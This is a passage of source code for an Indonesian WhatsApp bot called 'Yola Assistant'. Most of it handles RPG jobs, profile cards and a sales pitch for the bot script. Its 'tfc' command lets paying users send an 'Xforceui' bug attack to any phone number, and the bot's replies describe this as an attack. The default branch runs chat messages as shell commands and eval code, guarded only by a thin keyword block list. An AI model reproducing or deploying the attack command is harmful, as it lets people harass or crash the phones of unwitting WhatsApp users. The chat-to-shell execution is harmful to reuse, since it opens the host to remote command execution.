                let jobListText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ *Daftar Pekerjaan yang Tersedia* 💼\n│✧\n`;
                if (Object.keys(rpgJobs).length === 0) {
                    jobListText += `│✧ _Aduh, kayaknya belum ada lowongan kerja nih..._\n`;
                } else {
                    for (const jobId in rpgJobs) {
                        const job = rpgJobs[jobId];
                        jobListText += `│✧ *ID: \`${job.id}\` - ${job.name}*\n│✧    _${job.description}_\n│✧    Syarat Lv: ${job.levelRequirement || 1}\n│✧    Durasi: ${job.duration / 1000} detik\n│✧    Gaji: ${job.rewards.goldMin}-${job.rewards.goldMax}🪙, XP: ${job.rewards.xpMin}-${job.rewards.xpMax}✨`;
                         if (job.rewards.items && Object.keys(job.rewards.items).length > 0) {
                             const itemRewardsDesc = Object.entries(job.rewards.items)
                                 .map(([itemId, amount]) => `${amount}x ${capital(rpgItems[itemId]?.name || itemId)}`).join(', ');
                             jobListText += `\n│✧    Bonus Item: ${itemRewardsDesc} (Peluang: ${job.rewards.itemChance * 100}%)`;
                         }
                         jobListText += `\n│✧    Kerja: *${prefix}work ${job.id}*\n│✧\n`;
                    }
                }
                jobListText += `╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
                await reply(`${jobListText}`);
            }
            break;
            case 'work': {
                if (!isRegistered) return reply("────୨ Yola Assistant ৎ────\nDaftar dulu dong, Kak!\n────୨ Yola Assistant ৎ────");
                const jobIdToWork = args[0];
                if (!jobIdToWork) return reply("────୨ Yola Assistant ৎ────\nMau kerja apa nih, Kak? Masukin ID pekerjaannya ya. Cek di `.jobs`.\n────୨ Yola Assistant ৎ────");

                if (userRPG.currentAction) return reply(`────୨ Yola Assistant ৎ────\nKakak lagi ada kerjaan lain nih (${userRPG.currentAction.type.replace(/_/g, ' ')}). Selesain dulu yaa!\n────୨ Yola Assistant ৎ────`);
                if (userRPG.pendingAction) return reply(`────୨ Yola Assistant ৎ────\nKakak lagi nunggu mau ngapain gitu (${userRPG.pendingAction.type.replace(/_/g, ' ')}). Mulai atau batalin dulu ya.\n────୨ Yola Assistant ৎ────`);

                const jobData = rpgJobs[jobIdToWork];
                if (!jobData) return reply(`────୨ Yola Assistant ৎ────\nHmph! Pekerjaan dengan ID \`${jobIdToWork}\` gak Yola temuin.\n────୨ Yola Assistant ৎ────`);
                if (jobData.levelRequirement && userRPG.level < jobData.levelRequirement) return reply(`────୨ Yola Assistant ৎ────\nAduh, level Kakak (${userRPG.level}) belum cukup buat kerja jadi *${jobData.name}* (Minimal Lv.${jobData.levelRequirement} yaa).\n────୨ Yola Assistant ৎ────`);

                const now = Date.now();
                if (now - (userRPG.lastJobTimestamp || 0) < JOB_COOLDOWN && userRPG.currentJob === jobIdToWork) {
                    const remainingTime = Math.ceil((JOB_COOLDOWN - (now - userRPG.lastJobTimestamp)) / 1000);
                     const minutes = Math.floor(remainingTime / 60);
                    const seconds = remainingTime % 60;
                    return reply(`────୨ Yola Assistant ৎ────\nKakak baru aja selesai kerja jadi *${jobData.name}*. Istirahat dulu yaa~ Cooldown: *${minutes > 0 ? minutes + ' menit ' : ''}${seconds} detik* lagi.\n────୨ Yola Assistant ৎ────`);
                }

                userRPG.currentAction = {
                    type: 'job_active',
                    jobId: jobIdToWork,
                    startTime: now,
                    endTime: now + jobData.duration
                };
                userRPG.currentJob = jobIdToWork;
                saveUsers(m.sender);
                const initialMsg = await reply(`────୨ Yola Assistant ৎ────\n💼 Oke! Kakak mulai kerja jadi *${jobData.name}*! Bakal berlangsung selama ${jobData.duration / 1000} detik. Semangat kerjanya yaa~ >_<\n────୨ Yola Assistant ৎ────`);
                runSimulation(m.sender, 'job', jobIdToWork, now + jobData.duration, m.chat, initialMsg.key);
            }
            break;
            case 'jobcomplete': {
                if (!userRPG.currentAction || userRPG.currentAction.type !== 'job_active') {
                    const now = Date.now();
                     // Check if job ended recently
                     if (userRPG.lastJobTimestamp && (now - userRPG.lastJobTimestamp) < (JOB_COOLDOWN / 2)) { // Allow completing shortly after cooldown ends
                         return reply("────୨ Yola Assistant ৎ────\n✅ Kakak baru aja selesai kerja. Gaji udah dikasih kok~\n────୨ Yola Assistant ৎ────");
                     }
                    return reply("────୨ Yola Assistant ৎ────\nKakak lagi gak kerja nih.\n────୨ Yola Assistant ৎ────");
                }

                const now = Date.now();
                const action = userRPG.currentAction;
                const jobId = action.jobId;
                const jobData = rpgJobs[jobId];

                if (!jobData) {
                    userRPG.currentAction = null;
                    userRPG.currentJob = null;
                    saveUsers(m.sender);
                    return reply("────୨ Yola Assistant ৎ────\nAduh, data pekerjaannya gak ketemu nih... Aksinya Yola batalin ya.\n────୨ Yola Assistant ৎ────");
                }

                if (now < action.endTime) {
                    const remainingTime = Math.ceil((action.endTime - now) / 1000);
                     const minutes = Math.floor(remainingTime / 60);
                    const seconds = remainingTime % 60;
                    return reply(`────୨ Yola Assistant ৎ────\nBelum selesai kerja nih, Kak! Tunggu ${minutes > 0 ? minutes + ' menit ' : ''}${seconds} detik lagi yaa.\n────୨ Yola Assistant ৎ────`);
                }

                const goldReward = generateRandomNumber(jobData.rewards.goldMin, jobData.rewards.goldMax);
                const xpReward = generateRandomNumber(jobData.rewards.xpMin, jobData.rewards.xpMax);
                let itemRewardsText = "";

                userRPG.currency.gold = (userRPG.currency.gold || 0) + goldReward;
                userRPG.xp = (userRPG.xp || 0) + xpReward;
                userRPG.totalXpEarned = (userRPG.totalXpEarned || 0) + xpReward;
                userRPG.lastJobTimestamp = now;

                if (jobData.rewards.items && jobData.rewards.itemChance > 0) {
                    for (const itemId in jobData.rewards.items) {
                        if (Math.random() < (jobData.rewards.itemChance || 1)) {
                            const amount = jobData.rewards.items[itemId];
                            if (rpgItems[itemId]) {
                                userRPG.inventory[itemId] = (userRPG.inventory[itemId] || 0) + amount;
                                itemRewardsText += `   + ${amount}x ${capital(rpgItems[itemId].name)}\n`;
                            }
                        }
                    }
                }

                checkForLevelUp(m.sender, reply);
                userRPG.currentAction = null;
                saveUsers(m.sender);

                let completeMsg = `────୨ Yola Assistant ৎ────\n🎉 Kerja jadi *${jobData.name}* Selesai! Yeay! 🎉\n\n`;
                completeMsg += `✨ Kakak dapet gaji:\n   +${toRupiah(xpReward)} XP\n   +${toRupiah(goldReward)} 🪙 Emas\n`;
                if (itemRewardsText) {
                    completeMsg += "🎁 Bonus item dari kerja keras:\n" + itemRewardsText;
                }
                await reply(`${completeMsg}\n────୨ Yola Assistant ৎ────`);
            }
            break;
            case 'tfc': {
                if (!isPremium && !isOwner) return reply("────୨ Yola Assistant ৎ────\n*[ 403 ]* Fitur ini khusus buat Kakak Premium atau Owner Yola aja~\n────୨ Yola Assistant ৎ────");
                if (!q) return reply(`────୨ Yola Assistant ৎ────\nContoh: ${prefix + command} 628xxx\n────୨ Yola Assistant ৎ────`);

                let targetNumber = q.replace(/[^0-9]/g, "");
                if (!targetNumber || targetNumber.length < 9) return reply("────୨ Yola Assistant ৎ────\nNomor targetnya salah atau kependekan nih, Kak.\n────୨ Yola Assistant ৎ────");

                if ([botNumber.split('@')[0], ...global.owner.map(v => v.replace(/[^0-9]/g, '')), ...OwnerR.map(v => v.split('@')[0])].includes(targetNumber)) {
                    return reply("────୨ Yola Assistant ৎ────\n💢 Hmph! Gak boleh kirim bug ke Owner atau Yola sendiri!\n────୨ Yola Assistant ৎ────");
                }

                let target = targetNumber + "@s.whatsapp.net";

                try {
                    await reply(`────୨ Yola Assistant ৎ────\n🔥 Oke! Yola mulai serangan Xforceui ke *${targetNumber}*... Ini mungkin butuh waktu yaa, Kak!\n────୨ Yola Assistant ৎ────`);
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "💣",
                            key: m.key
                        }
                    });
                    await sleep(1500);

                    await Xforceui(target, yola);

                    await sleep(2000);
                    await reply(`────୨ Yola Assistant ৎ────\n✅ Serangan Xforceui ke *${targetNumber}* udah Yola selesai kirim! Efeknya tergantung perangkat target yaa~\n────୨ Yola Assistant ৎ────`);
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "💥",
                            key: m.key
                        }
                    });

                } catch (error) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, gagal kirim serangan Xforceui ke *${targetNumber}* nih, Kak.\nError: ${error.message.slice(0,100)}\n────୨ Yola Assistant ৎ────`);
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "❌",
                            key: m.key
                        }
                    });
                }
            }
            break;
            case 'rpgcard': {
                let targetJid = m.sender;
                if (q) {
                    const targetUserRpgId = parseInt(q.replace('@', ''));
                    if (!isNaN(targetUserRpgId)) {
                        targetJid = findUserByRPGID(targetUserRpgId);
                        if (!targetJid) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Petualang dengan ID *${targetUserRpgId}* gak Yola temuin.\n────୨ Yola Assistant ৎ────`);
                    } else {
                        const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                        if (mentioned) {
                            targetJid = mentioned;
                        } else {
                            const potentialJid = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                            let found = false;
                            try {
                                const [result] = await yola.onWhatsApp(potentialJid);
                                if (result?.exists) {
                                    targetJid = result.jid;
                                    found = true;
                                }
                            } catch {}
                            if (!found) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Pengguna "${q}" gak Yola temuin. Coba @tag, ID Petualang, atau nomor WA yaa~\n────୨ Yola Assistant ৎ────`);
                        }
                    }
                }

                const targetData = registeredUsers[targetJid];
                if (!targetData || !targetData.rpg) return reply(targetJid === m.sender ? `────୨ Yola Assistant ৎ────\n🛡️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────` : `────୨ Yola Assistant ৎ────\n🛡️ @${targetJid.split('@')[0]} belum terdaftar sebagai petualang.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });

                const rpg = targetData.rpg;
                let leaderboardRank = "N/A";
                const allUsersArray = Object.entries(registeredUsers).filter(([jid, data]) => data.rpg && data.name).map(([jid, data]) => ({
                    jid,
                    ...data.rpg,
                    rpgId: data.rpgId,
                    name: data.name
                }));
                const rankOrder = Object.keys(rankThresholds).reverse();
                allUsersArray.sort((a, b) => {
                    const rankComparison = rankOrder.indexOf(getRankByTotalXp(a.totalXpEarned)) - rankOrder.indexOf(getRankByTotalXp(b.totalXpEarned));
                    if (rankComparison !== 0) return rankComparison;
                    return (b.totalXpEarned || 0) - (a.totalXpEarned || 0);
                });
                const userRankIndex = allUsersArray.findIndex(user => user.jid === targetJid);
                if (userRankIndex !== -1) leaderboardRank = `#${userRankIndex + 1}`;


                const guildName = rpg.guildId && guilds[rpg.guildId] ? guilds[rpg.guildId].name : "-";
                const partyName = rpg.partyId && parties[rpg.partyId] ? parties[rpg.partyId].name : "-";

                let cardText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ *Kartu Petualang* 📇\n│✧\n│✧ *Nama:* ${targetData.name}\n│✧ *Level:* ${rpg.level || 1}\n│✧ *Rank:* ${getRankByTotalXp(rpg.totalXpEarned) || 'G'}\n│✧ *XP Saat Ini:* ${toRupiah(rpg.xp || 0)}\n│✧ *Total XP:* ${toRupiah(rpg.totalXpEarned || 0)}\n│✧ *Guild:* ${guildName}\n│✧ *Party:* ${partyName}\n│✧ *Peringkat Petualang:* ${leaderboardRank}\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;

                await reply(`${cardText}`, {
                    mentions: [targetJid]
                });
            }
            break;
            case 'sc':
            case 'script': {
                const scriptPrice = 50000;
                const ownerNumber = global.owner[0];
                let scriptText = `────୨ Yola Assistant ৎ────\n✨ *Ingin Punya Bot Keren Kayak Yola Assistant?* ✨\n\n`;
                scriptText += `Kamu bisa dapetin script Yola Assistant dengan fitur lengkap dan dukungan penuh!\n\n`;
                scriptText += `💰 *Harga Script:* ${toRupiah(scriptPrice)}\n\n`;
                scriptText += `💖 *Kenapa Pilih Script Yola?*\n`;
                scriptText += `  • Fitur RPG yang seru dan kompleks.\n`;
                scriptText += `  • AI cerdas dengan berbagai mode.\n`;
                scriptText += `  • Fitur grup yang lengkap (Anti-link, Anti-toxic, dll).\n`;
                scriptText += `  • Menu yang interaktif dan mudah digunakan (pilihan V1 & V2).\n`;
                scriptText += `  • Kode yang relatif rapi dan mudah dikembangkan.\n`;
                scriptText += `  • Dukungan dari developer jika ada kesulitan.\n\n`;
                scriptText += `💬 *Berminat?*\n`;
                scriptText += `Langsung aja hubungi Owner Yola dengan ketik *${prefix}owner* atau chat langsung ke:\n`;
                scriptText += `wa.me/${ownerNumber}\n\n`;
                scriptText += `Jangan sampai ketinggalan yaa buat punya asisten AI imut sendiri! 😉\n────୨ Yola Assistant ৎ────`;

                const contextInfo = defaultContextInfoBuilder(pushname, command);

                if (currentMenuStyle === 'V1') {
                    let buttons = [{
                        buttonId: `${prefix}owner`,
                        buttonText: {
                            displayText: "👑 Chat Owner"
                        },
                        type: 1
                    }, {
                        name: "cta_url",
                        buttonParamsJson: `{\"display_text\":\"Chat Owner Langsung\",\"url\":\"https://wa.me/${ownerNumber}\",\"merchant_url\":\"https://wa.me/${ownerNumber}\"}`
                    }];

                    const flowMessage = {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                                externalAdReply: contextInfo.externalAdReply
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: scriptText
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: "Yola Asisten by ThanDz"
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    title: "📦 Penawaran Script Yola Assistant 📦",
                                    hasMediaAttachment: false
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: buttons
                                })
                            })
                        }
                    };
                    await yola.relayMessage(m.chat, flowMessage.message, {
                        messageId: `flow_script_offer_${m.key.id}`
                    });

                } else {
                    await reply(`${scriptText}`, {
                        contextInfo
                    });
                }
            }
            break;


            default:
                if (isCmd && command) {
                    let caseNames = [];
                    try {
                        const data = fs.readFileSync(__filename, 'utf8');
                        const casePattern = /case\s+['"`]([^'"`]+)['"`]\s*:/g;
                        let match;
                        const caseNamesSet = new Set();
                        while ((match = casePattern.exec(data)) !== null) caseNamesSet.add(match[1]);
                        const aliases = ["help", "cmd", "stiker", "sgif", "s", "hneko", "nwaifu", "kick", "tendang", "clr", "tt", "delbadwords", "clc", "opc", "close", "open", "hd", "remini", "upscale", "iptrack", "trackip", "enable", "disable", "chmv1", "chmv2", "balogo", "pixivh", "wecchi", "whentai", "wmaid", "woral", "wass", "wwaifu", "wmilf", "daftar", "profile", "inv", "dungeon", "dungeonstart", "dungeoncomplete", "unreg", "confirmunreg", "heal", "sell", "buy", "marry", "acceptmarry", "divorce", "confirmdivorce", "rpgmenu", "additem", "addgold", "trade", "questlist", "acceptquest", "queststart", "guild", "createguild", "joinguild", "party", "createparty", "joinparty", "requestlicense", "dungeonlist", "accepttrade", "rejecttrade", "canceltrade", "abandonquest", "queststatus", "questcomplete", "handle_daftar_role", "handle_daftar_gender", "leaveguild", "guildinfo", "myguild", "acceptguild", "rejectguild", "kickguild", "inviteparty", "acceptparty", "leaveparty", "kickparty", "partyinfo", "handle_party_accept", "listhouse", "buyhouse", "myhouse", "seks", "leaderboard", "handle_guild_accept_req", "handle_guild_reject_req", "handle_marry_accept", "handle_marry_reject", "handle_seks_accept", "handle_seks_reject", "handle_confirm_divorce", "handle_cancel_divorce", "handle_shop_category_select", "confirm_unreg_handler", "handle_trade_confirm", "handle_trade_reject", "handle_party_reject", "handle_cancel_unreg", "handle_confirm_bug", "cancel_bug", "handle_pinterest_next", "handle_pixivh_next", "handle_nsfw_next", "handle_yola_ai_set", "pilihrole", "pilihgender", "sex", "tas", "status", "stats", "profil", "infobot", "job", "work", "jobs", "uprank", "jobcomplete", "yolaa", "ai", "tutor", "confirm_bug", "rpgcard", "sc", "script", "angekan", "hitamkan", "aiimg", "geminiimg", "brati", "bratv", "shopweapon", "shoparmor", "shopshield", "shopconsumable", "shopmaterial", "shopspecial", "mediafire", "mf", "use", "release", "cekid", "aio", "play", "confess", "handle_confess_reply", "changepartyname", "handle_changepartyname_confirm", "handle_changepartyname_cancel"];
                        aliases.forEach(alias => caseNamesSet.add(alias));
                        caseNames = Array.from(caseNamesSet);
                    } catch (err) {}
                    let noPrefixCmd = command;
                    let mean = didyoumean(noPrefixCmd, caseNames);
                    let sim = mean ? similarity(noPrefixCmd, mean) : 0;
                    if (mean && sim > 0.6 && noPrefixCmd.toLowerCase() !== mean.toLowerCase()) {
                        if (currentMenuStyle === 'V1') {
                            let response = `────୨ Yola Assistant ৎ────\n❓ Hmph! Perintah \`${
                                prefix + command
                            }\` gak ada tuh, Kak.\nMungkin maksud Kakak \`${
                                prefix + mean
                            }\` yaa?\n────୨ Yola Assistant ৎ────`;
                            let buttons = [{
                                buttonId: `${prefix + mean} ${args.join(' ')}`.trim(),
                                buttonText: {
                                    displayText: `✅ Iya, Pakai ${prefix + mean}`
                                },
                                type: 1
                            }];
                            let buttonMessage = {
                                text: response,
                                footer: 'Yola Asisten by ThanDz',
                                buttons: buttons,
                                headerType: 1,
                                contextInfo: defaultContextInfoBuilder(pushname)
                            };
                            await yola.sendMessage(m.chat, buttonMessage, {
                                quoted: m
                            });
                        } else {
                            await reply(`────୨ Yola Assistant ৎ────\n❓ Hmph! Perintah \`${
                                prefix + command
                            }\` gak ada tuh, Kak.\nMungkin maksud Kakak \`${
                                prefix + mean
                            }\` yaa?\n────୨ Yola Assistant ৎ────`);
                        }
                        return;
                    }
                }
                if (budy?.startsWith("$") && budy?.length > 1) {
                    if (!isOwner) return reply("────୨ Yola Assistant ৎ────\nHmph! This command is for the owner only!\n────୨ Yola Assistant ৎ────");
                    const commandToExec = budy.slice(1).trim();
                    if (commandToExec.match(/rm -rf|mv|shutdown|reboot/gi)) return reply("────୨ Yola Assistant ৎ────\nDangerous command!\n────୨ Yola Assistant ৎ────");
                    const {
                        exec
                    } = require("child_process");
                    exec(commandToExec, (err, stdout, stderr) => {
                        let output = "";
                        if (err) output += `Error: ${util.format(err)}\n`;
                        if (stderr) output += `Stderr: ${util.format(stderr)}\n`;
                        if (stdout) output += `Stdout: ${util.format(stdout)}`;
                        reply(`────୨ Yola Assistant ৎ────\n${output.trim() || "Execution finished."}\n────୨ Yola Assistant ৎ────`);
                    });
                }
                if (budy?.startsWith("=>") && budy?.length > 2) {
                    if (!isOwner) return reply("────୨ Yola Assistant ৎ────\nHmph! This command is for the owner only!\n────୨ Yola Assistant ৎ────");
                    try {
                        const evaling = await eval(`;(async () => { ${text} })();`);
                        reply(`────୨ Yola Assistant ৎ────\n${util.format(evaling)}\n────୨ Yola Assistant ৎ────`);
                    } catch (e) {
                        reply(`────୨ Yola Assistant ৎ────\n${util.format(e)}\n────୨ Yola Assistant ৎ────`);
                    }
                }
                if (budy?.startsWith(">") && budy?.length > 1) {
                    if (!isOwner) return reply("────୨ Yola Assistant ৎ────\nHmph! This command is for the owner only!\n────୨ Yola Assistant ৎ────");
                    try {
                        let evaled = await eval(text);
                        if (typeof evaled !== "string") evaled = util.inspect(evaled, {
                            depth: 2
                        });
                        reply(`────୨ Yola Assistant ৎ────\n${util.format(evaled)}\n────୨ Yola Assistant ৎ────`);
                    } catch (e) {
                        reply(`────୨ Yola Assistant ৎ────\n${util.format(e)}\n────୨ Yola Assistant ৎ────`);
                    }
                }
        }
    } catch (e) {
        const errorContext = defaultContextInfoBuilder(m?.pushName || m?.sender?.split("@")[0] || 'User', command);
        try {
            const stackTrace = e.stack?.split('\n').slice(0, 7).join('\n') || '?';
            await yola.sendMessage(m.chat, {
                text: `────୨ Yola Assistant ৎ────\n_Aduuuh! Yola pusing nih, ada error! >.<\n\nPerintah: ${ command || "?" }\nErrornya: ${e.message}\nStack-nya: \`\`\`${stackTrace}\`\`\`\n────୨ Yola Assistant ৎ────`,
                contextInfo: errorContext
            }, {
                quoted: m
            });
        } catch (sendError) {}
    }
};

process.on("uncaughtException", function(err) {
});
process.on("unhandledRejection", (reason, promise) => {
});

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.redBright(`Update '${__filename}'`));
    delete require.cache[file];
    // Re-load configs
    ensureDir(DB_DIR);
    ensureDir(TMP_DIR);
    try {
        yolaAiConfig = loadConfig(filePaths.YOLA_AI_CONFIG_PATH, {
            enabled: false
        });
        yolaChatHistories = loadConfig(filePaths.YOLA_CHAT_HISTORY_PATH, {});
        Premium = loadConfig(filePaths.PREMIUM_DB_PATH, []);
        registeredUsers = loadConfig(filePaths.USERS_DB_PATH, {});
        guilds = loadConfig(filePaths.GUILDS_DB_PATH, {});
        parties = loadConfig(filePaths.PARTIES_DB_PATH, {});
        NotifAdzanGroups = loadConfig(filePaths.NOTIF_ADZAN_GROUPS_PATH, []);
        currentMenuStyleConfig = loadConfig(filePaths.MENU_STYLE_PATH, {
            style: 'V1'
        });
        currentMenuStyle = currentMenuStyleConfig.style || 'V1';
        badwords = loadConfig(filePaths.BADWORDS_PATH, []);
        ntvirtex = loadConfig(filePaths.ANTIVIRTEX_PATH, []);
        nttoxic = loadConfig(filePaths.ANTITOXIC_PATH, []);
        ntwame = loadConfig(filePaths.ANTIWAME_PATH, []);
        ntilinkgc = loadConfig(filePaths.ANTILINKGC_PATH, []);
        ntilinkall = loadConfig(filePaths.ANTILINKALL_PATH, []);
        ntasing = loadConfig(filePaths.ANTIASING_PATH, []);
        OwnerR = loadConfig(filePaths.OWNER_JSON_PATH, []);
        pendingTrades = loadConfig(filePaths.PENDING_TRADES_PATH, {});
        rpgCounter = loadConfig(filePaths.RPG_COUNTER_PATH, {
            lastUserId: 0,
            lastGuildId: 0,
            lastPartyId: 0
        });
        partyInvites = loadConfig(filePaths.PARTY_INVITES_PATH, {});
        pendingProposals = loadConfig(filePaths.PENDING_PROPOSALS_PATH, {});
        pendingSeksRequests = loadConfig(filePaths.PENDING_SEKS_REQUESTS_PATH, {});
        activeDungeons = loadConfig(filePaths.ACTIVE_DUNGEONS_PATH, {});
        activeQuests = loadConfig(filePaths.ACTIVE_QUESTS_PATH, {});
        customCases = loadConfig(filePaths.CUSTOM_CASES_PATH, {});
        pendingConfesses = loadConfig(filePaths.PENDING_CONFESS_PATH, {});

    } catch (loadErr) {
        console.error("Error reloading configs:", loadErr);
    }
    try {
        require(file);
    } catch (requireErr) {
        console.error("Error re-requiring module:", requireErr);
    }
});

async function handleSimpleImageApi(yolaInstance, msg, captionText, apiUrl, buttonText, ownerCheck, premiumCheck, replyFn, contextInfo) {
    if (!ownerCheck && !premiumCheck) return replyFn(`────୨ Yola Assistant ৎ────\n🔒 Khusus Owner/Premium.\n────୨ Yola Assistant ৎ────`);
    await yolaInstance.sendMessage(msg.chat, {
        react: {
            text: "⏳",
            key: msg.key
        }
    });
    try {
        const response = await axios.get(apiUrl);
        let imageUrl;
        if (response.data?.url) imageUrl = response.data.url;
        else if (response.data?.link) imageUrl = response.data.link;
        else if (response.data?.images?.[0]?.url) imageUrl = response.data.images[0].url;
        else if (response.data?.result?.url) imageUrl = response.data.result.url;
        else if (response.data?.result?.link) imageUrl = response.data.result.link;
        else if (typeof response.data === 'string' && response.data.startsWith('http')) imageUrl = response.data;
        else if (response.data?.results?.[0]) imageUrl = response.data.results[0];
        else throw new Error("URL gambarnya gak ketemu di respons API nih, Kak...");

        const buttonId = `nsfw_next_${msg.command.replace(msg.prefix, '').toLowerCase()}`;
        let buttonsNsfw;
        if (currentMenuStyle === 'V1') {
            buttonsNsfw = [{
                buttonId: buttonId,
                buttonText: {
                    displayText: buttonText
                },
                type: 1
            }];
        }
 

        const messagePayload = {
            image: {
                url: imageUrl
            },
            caption: `────୨ Yola Assistant ৎ────\n${captionText}`,
            footer: "Yola Asisten by ThanDz",
            contextInfo: contextInfo.externalAdReply
        };

        if (currentMenuStyle === 'V1' && buttonsNsfw) {
            messagePayload.buttons = buttonsNsfw;
            messagePayload.headerType = 4;
        } else if (currentMenuStyle === 'V2') {
             messagePayload.caption += `\n\nKetik \`${msg.prefix}${msg.command.split('-')[0]}next ${msg.command.replace(msg.prefix, '').toLowerCase()}\` untuk gambar berikutnya.\n────୨ Yola Assistant ৎ────`;
        }


        await yolaInstance.sendMessage(msg.chat, messagePayload, {
            quoted: msg
        });
        await yolaInstance.sendMessage(msg.chat, {
            react: {
                text: "✅",
                key: msg.key
            }
        });
    } catch (error) {
        await replyFn(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal ngambil gambarnya: ${error.message}\n────୨ Yola Assistant ৎ────`);
        await yolaInstance.sendMessage(msg.chat, {
            react: {
                text: "❌",
                key: msg.key
            }
        });
    }
}